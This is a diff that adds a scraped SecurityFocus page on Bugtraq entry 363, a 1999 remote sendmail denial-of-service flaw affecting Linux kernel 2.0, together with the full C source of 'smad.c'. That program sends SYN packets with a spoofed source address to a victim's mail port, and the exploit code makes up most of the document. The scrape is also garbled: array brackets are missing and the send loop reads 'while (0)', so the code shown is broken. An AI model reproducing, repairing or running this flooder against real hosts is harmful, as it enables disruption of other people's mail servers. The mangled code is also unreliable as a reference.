@@ -1,0 +1,103 @@
+#SpeeDr00t@Black Falcon<br>#bid363<p><b><span style="font-size: 18pt;">Linux Sendmail Denial of Service Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/363/info">info</a><br><a href="http://www.securityfocus.com/bid/363/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/363/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/363/solution">solution</a><br><a href="http://www.securityfocus.com/bid/363/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				363
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Failure to Handle Exceptional Conditions
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 28 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 28 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				First posted to BugTraq by Michal Zalewski.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Linux kernel 2.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Linux kernel 2.3 <br/>
+					
+				
+					Linux kernel 2.2 <br/>
+					
+				
+					Linux kernel 2.1 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	 /*<br/><br/> * smad.c - sendmail accept dos -<br/><br/> *<br/><br/> * Salvatore Sanfilippo AntireZ<br/><br/> * Intesis SECURITY LAB Phone: +39-2-671563.1<br/><br/> * Via Settembrini, 35 Fax: +39-2-66981953<br/><br/> * I-20124 Milano ITALY Email: antirez@seclab.com<br/><br/> * md5330@mclink.it<br/><br/> *<br/><br/> * compile it under Linux with gcc -Wall -o smad smad.c<br/><br/> *<br/><br/> * usage: smad fakeaddr victim port<br/><br/> */<br/><br/> #include &lt;unistd.h&gt;<br/><br/> #include &lt;string.h&gt;<br/><br/> #include &lt;stdio.h&gt;<br/><br/> #include &lt;stdlib.h&gt;<br/><br/> #include &lt;arpa/inet.h&gt;<br/><br/> #include &lt;sys/types.h&gt;<br/><br/> #include &lt;sys/socket.h&gt;<br/><br/> #include &lt;netinet/tcp.h&gt;<br/><br/> #include &lt;netinet/ip.h&gt;<br/><br/> #include &lt;netinet/in.h&gt;<br/><br/> #include &lt;netdb.h&gt;<br/><br/> #include &lt;unistd.h&gt;<br/><br/> #define SLEEP_UTIME 100000 /* modify it if necessary */<br/><br/> #define PACKETSIZE (sizeof(struct iphdr) + sizeof(struct tcphdr))<br/><br/> #define OFFSETTCP (sizeof(struct iphdr))<br/><br/> #define OFFSETIP (0)<br/><br/> u_short cksum(u_short *buf, int nwords)<br/><br/> {<br/><br/> unsigned long sum;<br/><br/> u_short *w = buf;<br/><br/> for (sum = 0; nwords &gt; 0; nwords-=2)<br/><br/> sum += *w++;<br/><br/> sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);<br/><br/> sum += (sum &gt;&gt; 16);<br/><br/> return ~sum;<br/><br/> }<br/><br/> void resolver (struct sockaddr * addr, char *hostname, u_short port)<br/><br/> {<br/><br/> struct sockaddr_in *address;<br/><br/> struct hostent *host;<br/><br/> address = (struct sockaddr_in *)addr;<br/><br/> (void) bzero((char *)address, sizeof(struct sockaddr_in));<br/><br/> address-&gt;sin_family = AF_INET;<br/><br/> address-&gt;sin_port = htons(port);<br/><br/> address-&gt;sin_addr.s_addr = inet_addr(hostname);<br/><br/> if ( (int)address-&gt;sin_addr.s_addr == -1) {<br/><br/> host = gethostbyname(hostname);<br/><br/> if (host) {<br/><br/> bcopy( host-&gt;h_addr,<br/><br/> (char *)&amp;address-&gt;sin_addr,host-&gt;h_length);<br/><br/> } else {<br/><br/> perror("Could not resolve address");<br/><br/> exit(-1);<br/><br/> }<br/><br/><br/> }<br/><br/> }<br/><br/> int main(int argc, char **argv)<br/><br/> {<br/><br/> char runchar = "|/-\\";<br/><br/> char packetPACKETSIZE,<br/><br/> *fromhost,<br/><br/> *tohost;<br/><br/> u_short fromport = 3000,<br/><br/> toport = 25;<br/><br/> struct sockaddr_in local, remote;<br/><br/> struct iphdr *ip = (struct iphdr*) (packet + OFFSETIP);<br/><br/> struct tcphdr *tcp = (struct tcphdr*) (packet + OFFSETTCP);<br/><br/> struct tcp_pseudohdr<br/><br/> {<br/><br/> struct in_addr saddr;<br/><br/> struct in_addr daddr;<br/><br/> u_char zero;<br/><br/> u_char protocol;<br/><br/> u_short lenght;<br/><br/> struct tcphdr tcpheader;<br/><br/> }<br/><br/> pseudoheader;<br/><br/> int sock, result, runcharid = 0;<br/><br/> if (argc &lt; 3)<br/><br/> {<br/><br/> printf("usage: %s fakeaddr victim port\n", argv0);<br/><br/> exit(0);<br/><br/> }<br/><br/> if (argc == 4)<br/><br/> toport = atoi(argv3);<br/><br/> bzero((void*)packet, PACKETSIZE);<br/><br/> fromhost = argv1;<br/><br/> tohost = argv2;<br/><br/> resolver((struct sockaddr*)&amp;local, fromhost, fromport);<br/><br/> resolver((struct sockaddr*)&amp;remote, tohost, toport);<br/><br/> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<br/><br/> if (sock == -1) {<br/><br/> perror("can't get raw socket");<br/><br/> exit(1);<br/><br/> }<br/><br/> /* src addr */<br/><br/> bcopy((char*)&amp;local.sin_addr, &amp;ip-&gt;saddr,sizeof(ip-&gt;saddr));<br/><br/> /* dst addr */<br/><br/> bcopy((char*)&amp;remote.sin_addr,&amp;ip-&gt;daddr,sizeof(ip-&gt;daddr));<br/><br/> ip-&gt;version = 4;<br/><br/> ip-&gt;ihl = sizeof(struct iphdr)/4;<br/><br/> ip-&gt;tos = 0;<br/><br/> ip-&gt;tot_len = htons(PACKETSIZE);<br/><br/> ip-&gt;id = htons(getpid() &amp; 255);<br/><br/> /* no flags */<br/><br/> ip-&gt;frag_off = 0;<br/><br/> ip-&gt;ttl = 64;<br/><br/> ip-&gt;protocol = 6;<br/><br/> ip-&gt;check = 0;<br/><br/> tcp-&gt;th_dport = htons(toport);<br/><br/> tcp-&gt;th_sport = htons(fromport);<br/><br/> tcp-&gt;th_seq = htonl(32089744);<br/><br/> tcp-&gt;th_ack = htonl(0);<br/><br/> tcp-&gt;th_off = sizeof(struct tcphdr)/4;<br/><br/> /* 6 bit reserved */<br/><br/> tcp-&gt;th_flags = TH_SYN;<br/><br/> tcp-&gt;th_win = htons(512);<br/><br/> /* start of pseudo header stuff */<br/><br/> bzero(&amp;pseudoheader, 12+sizeof(struct tcphdr));<br/><br/> pseudoheader.saddr.s_addr=local.sin_addr.s_addr;<br/><br/> pseudoheader.daddr.s_addr=remote.sin_addr.s_addr;<br/><br/> pseudoheader.protocol = 6;<br/><br/> pseudoheader.lenght = htons(sizeof(struct tcphdr));<br/><br/> bcopy((char*) tcp, (char*) &amp;pseudoheader.tcpheader,<br/><br/> sizeof(struct tcphdr));<br/><br/> /* end */<br/><br/> tcp-&gt;th_sum = cksum((u_short *) &amp;pseudoheader,<br/><br/> 12+sizeof(struct tcphdr));<br/><br/> /* 16 bit urg */<br/><br/> while (0)<br/><br/>{<br/><br/> result = sendto(sock, packet, PACKETSIZE, 0,<br/><br/> (struct sockaddr *)&amp;remote, sizeof(remote));<br/><br/> if (result != PACKETSIZE)<br/><br/> {<br/><br/> perror("sending packet");<br/><br/> exit(0);<br/><br/> } printf("\b");<br/><br/> printf("%c", runcharruncharid);<br/><br/> fflush(stdout);<br/><br/> runcharid++;<br/><br/> if (runcharid == 4)<br/><br/> runcharid = 0;<br/><br/> usleep(SLEEP_UTIME);<br/><br/> }<br/><br/> return 0;<br/><br/> }
+	
+		<ul>
+</ul>
+</div>
